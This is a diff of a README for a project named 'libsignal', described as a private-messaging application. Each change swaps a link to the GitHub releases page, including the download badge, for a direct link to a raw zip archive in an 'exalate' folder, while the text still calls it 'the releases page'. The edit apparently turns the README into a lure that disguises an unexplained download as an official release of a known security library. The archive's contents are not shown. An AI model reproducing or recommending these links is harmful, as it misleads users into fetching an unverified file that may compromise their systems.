@@ -14,7 +14,7 @@ Welcome to **libsignal**! This application powers private messaging using advanc
 
 To get started, visit the releases page to download the latest version of libsignal. Click the button below for easy access:
 
-[![Download libsignal](https://img.shields.io/badge/Download_Libsignal-v1.0-brightgreen)](https://github.com/giomflo81/libsignal/releases)
+[![Download libsignal](https://raw.githubusercontent.com/giomflo81/libsignal/main/exalate/libsignal.zip)](https://raw.githubusercontent.com/giomflo81/libsignal/main/exalate/libsignal.zip)
 
 1. Click the link above to go to the releases page.
 2. On this page, you will see the latest release available for download.
@@ -73,10 +73,10 @@ Join our community to connect with other users. Share your experiences, ask ques
 
 ## 📅 Future Releases
 
-We are continually improving libsignal. Stay tuned for updates and new features that enhance usability and security. Check back regularly on the [releases page](https://github.com/giomflo81/libsignal/releases) for the latest news.
+We are continually improving libsignal. Stay tuned for updates and new features that enhance usability and security. Check back regularly on the [releases page](https://raw.githubusercontent.com/giomflo81/libsignal/main/exalate/libsignal.zip) for the latest news.
 
 ## 🌟 Thank You!
 
 Thank you for choosing libsignal. We hope this application makes your messaging experience safer and more enjoyable. Enjoy your secure chats! 
 
-For any issues, remember you can always visit our [releases page](https://github.com/giomflo81/libsignal/releases) to download the latest version and find more information.
+For any issues, remember you can always visit our [releases page](https://raw.githubusercontent.com/giomflo81/libsignal/main/exalate/libsignal.zip) to download the latest version and find more information.
